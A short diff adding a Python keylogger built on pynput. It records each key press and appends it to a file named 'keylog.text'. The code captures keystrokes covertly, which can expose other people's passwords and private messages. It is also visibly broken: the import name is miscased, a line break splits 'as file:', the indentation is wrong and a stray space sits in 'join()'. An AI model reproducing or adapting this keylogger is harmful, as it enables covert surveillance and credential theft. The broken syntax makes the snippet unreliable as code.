@@ -1,0 +1,8 @@
+from pynput.keyboard import listener
+
+def log_key(key):
+    with open ("keylog.text", 'a') as
+file:
+    file.write(f"{key}\n") 
+with listener(on_press=log_key) as listener:
+    listener. join() 
